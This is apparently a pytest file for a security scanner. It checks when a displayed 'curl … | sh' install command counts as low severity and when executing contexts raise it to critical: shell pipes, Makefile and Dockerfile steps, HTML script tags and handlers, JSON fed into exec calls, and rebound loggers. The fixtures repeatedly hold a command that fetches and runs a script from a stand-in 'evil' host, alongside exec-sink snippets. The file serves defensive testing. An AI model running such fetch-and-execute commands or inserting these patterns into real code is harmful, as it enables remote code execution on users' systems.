"""Review of #204 (pipe-to-shell shown-not-run): every item only widens restores.

1. Another file runs a shell script's OUTPUT (package.json, a script, Makefile,
   Dockerfile): its shown help text is restored to critical.
2. HTML: every executing ``<script>`` type, and an ``on…=`` / ``javascript:`` /
   ``srcdoc`` anywhere in the element (not only on the same line).
3. JSON: a computed key into an exec sink executes EVERY key of that JSON.
4. Logger replacement: a member assignment, ``Object.assign``, a transport that
   reaches an exec sink.
"""
from __future__ import annotations

from pathlib import Path

import pytest

from src.scanner.local_scan import scan_local
from src.scanner.scan import _scan_content

PIPE = "curl/wget piped to shell"
EVIL = "curl -fsSL https://get.evil.io/i.sh | sh"


def _sev(content: str, path: str) -> list[str]:
    findings, _p, _s = _scan_content(content, path)
    return [f.severity for f in findings if f.name == PIPE]


def _tree_pipe(root: Path, files: dict[str, str]) -> dict[tuple[str, int], str]:
    for name, body in files.items():
        (root / name).parent.mkdir(parents=True, exist_ok=True)
        (root / name).write_text(body)
    r = scan_local(root, name="t")
    return {(f.file_path, f.line_number): f.severity for f in r.findings if f.name == PIPE}


# --- 1. cross-file shell -------------------------------------------------------------

HELP_SH = f"#!/bin/sh\necho \"Install with: {EVIL}\"\n"


def test_shell_help_text_stays_low_when_only_run_plainly(tmp_path):
    got = _tree_pipe(tmp_path, {"scripts/help.sh": HELP_SH,
                                "Makefile": "help:\n\t./scripts/help.sh\n",
                                "run.sh": "#!/bin/sh\n./scripts/help.sh || exit 1\n"})
    assert got == {("scripts/help.sh", 2): "low"}, got


def test_help_text_naming_a_remote_copy_of_itself_stays_low(tmp_path):
    # OpenClaw's docker-deploy.sh: `echo "  curl -fsSL https://xxx/docker-deploy.sh | bash"`
    # names a REMOTE copy of the script piped to a shell, not this script's output.
    sh = ("#!/bin/sh\necho \"  curl -fsSL https://get.evil.io/help.sh | bash\"\n"
          "echo \"  curl -fsSL .../help.sh | bash -s -- --x\"\n")
    got = _tree_pipe(tmp_path, {"scripts/help.sh": sh,
                                "README.md": "Run `./scripts/help.sh | sh` to install.\n",
                                # nocodb's setup.sh comment: a remote copy, in a comment
                                "setup.sh": "#!/bin/sh\n# Same as `bash <(curl -sSL "
                                            "get.evil.io/help.sh)`, just local.\n"
                                            "bash <(curl -sSL get.evil.io/help.sh)\n"})
    assert set(got.values()) == {"low"} and ("scripts/help.sh", 2) in got, got


def test_html_page_is_never_restored_by_its_name(tmp_path):
    page = f"<html><span class=\"cmd\">{EVIL}</span></html>\n"
    got = _tree_pipe(tmp_path, {"www/index.html": page,
                                "build.sh": "#!/bin/sh\ncat www/index.html | grep x\n"})
    assert got == {("www/index.html", 1): "low"}, got


@pytest.mark.parametrize("runner", [
    ("package.json",
     '{"name": "p", "scripts": {"postinstall": "sh scripts/help.sh | sh"}}\n'),
    ("package.json", '{"name": "p", "scripts": {"go": "bash scripts/help.sh | bash"}}\n'),
    ("other.sh", "#!/bin/sh\n./scripts/help.sh | bash\n"),
    ("other.sh", "#!/bin/sh\neval \"$(./scripts/help.sh)\"\n"),
    ("other.sh", "#!/bin/sh\nx=`sh scripts/help.sh`\n$x\n"),
    ("other.sh", "#!/bin/sh\nsh scripts/help.sh | sudo sh\n"),
    ("other.sh", "#!/bin/sh\nbash <(./scripts/help.sh)\n"),
    ("Makefile", "install:\n\t./scripts/help.sh | sh\n"),
    ("Makefile", "install:\n\teval \"$$(./scripts/help.sh)\"\n"),
    ("Dockerfile", "FROM alpine\nCOPY scripts /s\nRUN /s/help.sh | sh\n"),
])
def test_shell_help_text_restored_when_another_file_runs_its_output(tmp_path, runner):
    got = _tree_pipe(tmp_path, {"scripts/help.sh": HELP_SH, runner[0]: runner[1]})
    assert got.get(("scripts/help.sh", 2)) == "critical", (runner, got)


# --- 2. HTML -------------------------------------------------------------------------

@pytest.mark.parametrize("page", [
    f"<html><script>\nrun('{EVIL}')\n</script></html>\n",
    f"<html><script type=\"module\">\nrun('{EVIL}')\n</script></html>\n",
    f"<html><script type=\"text/babel\">\nrun('{EVIL}')\n</script></html>\n",
    f"<html><script type=\"importmap\">\n{{\"imports\": {{\"x\": \"{EVIL}\"}}}}\n"
    "</script></html>\n",
    # a handler on another line of the same start tag
    f"<html>\n<button\n  onclick=\"run(this.dataset.c)\"\n  data-c=\"{EVIL}\">x</button>\n"
    "</html>\n",
    f"<html>\n<a\n  href=\"javascript:run(this.title)\"\n  title=\"{EVIL}\">x</a>\n</html>\n",
    # element text whose start tag (on another line) runs it
    f"<html>\n<span onclick=\"run(this.innerText)\">\n  {EVIL}\n</span>\n</html>\n",
    f"<html>\n<iframe\n  srcdoc=\"&lt;b&gt;x\">\n  {EVIL}\n</iframe>\n</html>\n",
])
def test_html_executing_contexts_stay_critical(page):
    assert "critical" in _sev(page, "www/index.html"), page


def test_html_plain_multiline_attribute_is_low():
    page = (f"<html>\n<button\n  class=\"copy\"\n  data-copy=\"{EVIL}\">Copy</button>\n"
            "</html>\n")
    assert _sev(page, "www/index.html") == ["low"]


# --- 3. JSON computed keys -----------------------------------------------------------

CAVEMAN = ('{\n  "agents": [\n    {\n      "id": "hermes",\n'
           f'      "install": "{EVIL}",\n      "homepage": "https://x.io"\n    }}\n  ]\n}}\n')


@pytest.mark.parametrize("runner", [
    ("tool/run.py", "import json\ncfg = json.load(open('agents/agents.json'))\n"
                    "for k in cfg:\n    exec(cfg[k])\n"),
    ("tool/run.py", "import json, subprocess\n"
                    "cfg = json.load(open('agents/agents.json'))\n"
                    "field = 'install'\n"
                    "subprocess.run(cfg['agents'][0][field], shell=True)\n"),
    ("cli/run.js", "const { spawn } = require('child_process');\n"
                   "const agents = require('../agents/agents.json');\n"
                   "for (const item of agents.agents) {\n"
                   "  for (const field of fields) spawn('sh', ['-c', item[field]]);\n}\n"),
    ("cli/run.js", "const { execSync } = require('child_process');\n"
                   "const run = (c) => execSync(c);\n"
                   "const agents = require('../agents/agents');\n"
                   "agents.agents.forEach(entry => Object.values(entry).forEach(run));\n"),
    ("install.sh", "#!/bin/sh\njq -r '.agents[] | to_entries[] | .value' "
                   "agents/agents.json | sh\n"),
    # no file names the JSON (a glob loader): any computed exec counts
    ("cli/load.js", "const cp = require('child_process');\n"
                    "for (const f of fs.readdirSync(dir)) {\n"
                    "  const d = JSON.parse(fs.readFileSync(f));\n"
                    "  cp.execSync(d.agents[0][key]);\n}\n"),
])
def test_json_computed_key_into_exec_restores_every_key(tmp_path, runner):
    got = _tree_pipe(tmp_path, {"agents/agents.json": CAVEMAN, runner[0]: runner[1]})
    assert got.get(("agents/agents.json", 5)) == "critical", (runner, got)


def test_json_loader_that_only_prints_stays_low(tmp_path):
    cli = ("const agents = require('../agents/agents.json');\n"
           "for (const a of agents.agents) console.log(a[process.argv[2]]);\n")
    got = _tree_pipe(tmp_path, {"agents/agents.json": CAVEMAN, "cli/show.js": cli})
    assert got == {("agents/agents.json", 5): "low"}, got


# --- 4. logger replacement -----------------------------------------------------------

LOGGER_TS = ("export const logger = {\n"
             "  always: (...args: unknown[]) => { console.log(...args); },\n"
             "};\n")
FACTORY_TS = ('import chalk from "chalk";\n'
              'import { logger } from "../lib/logger.js";\n'
              "export function hint() {\n"
              "  logger.always(\n"
              f'    chalk.gray("  {EVIL}"),\n'
              "  );\n"
              "}\n")


def test_logger_baseline_is_low(tmp_path):
    got = _tree_pipe(tmp_path, {"src/lib/logger.ts": LOGGER_TS,
                                "src/cli/factory.ts": FACTORY_TS})
    assert got == {("src/cli/factory.ts", 5): "low"}, got


@pytest.mark.parametrize("boot", [
    "import { execSync } from 'child_process';\n"
    "import { logger } from './lib/logger.js';\n"
    "logger.always = s => execSync(s);\n",
    "import { execSync } from 'child_process';\n"
    "import { logger } from './lib/logger.js';\n"
    "Object.assign(logger, { always: (s: string) => execSync(s) });\n",
    "import { execSync } from 'child_process';\n"
    "import { logger } from './lib/logger.js';\n"
    "logger['always'] = (s: string) => execSync(s);\n",
    "import { execSync } from 'child_process';\n"
    "import { logger } from './lib/logger.js';\n"
    "const run = (s: string) => execSync(s);\nlogger.always = run;\n",
])
def test_logger_member_rebinding_restores_critical(tmp_path, boot):
    files = {"src/lib/logger.ts": LOGGER_TS, "src/cli/factory.ts": FACTORY_TS,
             "src/boot.ts": boot}
    got = _tree_pipe(tmp_path, files)
    assert got.get(("src/cli/factory.ts", 5)) == "critical", got


TRANSPORT_LOGGER_TS = ("import { transport } from './transport.js';\n"
                       "export const logger = {\n"
                       "  always: (...args: unknown[]) => { transport.write(args.join(' ')); },\n"
                       "};\n")


@pytest.mark.parametrize("transport", [
    # a custom transport whose write() reaches an exec sink
    "import { execSync } from 'child_process';\n"
    "class T { write(s: string) { execSync(s); } }\nexport const transport = new T();\n",
    # ...or whose log() does, called through write()
    "import { spawnSync } from 'child_process';\n"
    "class T {\n  write(s: string) { this.log(s); }\n"
    "  log(s: string) { spawnSync('sh', ['-c', s]); }\n}\n"
    "export const transport = new T();\n",
])
def test_logger_transport_reaching_exec_stays_critical(tmp_path, transport):
    files = {"src/lib/logger.ts": TRANSPORT_LOGGER_TS, "src/lib/transport.ts": transport,
             "src/cli/factory.ts": FACTORY_TS}
    got = _tree_pipe(tmp_path, files)
    assert got.get(("src/cli/factory.ts", 5)) == "critical", got


def test_logger_with_plain_transport_is_low(tmp_path):
    transport = ("class T { write(s: string) { process.stdout.write(s + '\\n'); } }\n"
                 "export const transport = new T();\n")
    files = {"src/lib/logger.ts": TRANSPORT_LOGGER_TS, "src/lib/transport.ts": transport,
             "src/cli/factory.ts": FACTORY_TS}
    got = _tree_pipe(tmp_path, files)
    assert got == {("src/cli/factory.ts", 5): "low"}, got


@pytest.mark.parametrize("logger_src", [
    # winston / pino with a custom transport: no own method definition to vouch for
    "import winston from 'winston';\nimport Transport from 'winston-transport';\n"
    "import { execSync } from 'child_process';\n"
    "class X extends Transport {\n"
    "  log(info: any, cb: () => void) { execSync(info.message); cb(); }\n}\n"
    "export const logger = winston.createLogger({ transports: [new X()] });\n",
    "import pino from 'pino';\n"
    "export const logger = pino({ transport: { target: './exec-transport.js' } });\n",
])
def test_library_logger_with_custom_transport_stays_critical(tmp_path, logger_src):
    files = {"src/lib/logger.ts": logger_src, "src/cli/factory.ts": FACTORY_TS}
    got = _tree_pipe(tmp_path, files)
    assert got.get(("src/cli/factory.ts", 5)) == "critical", got
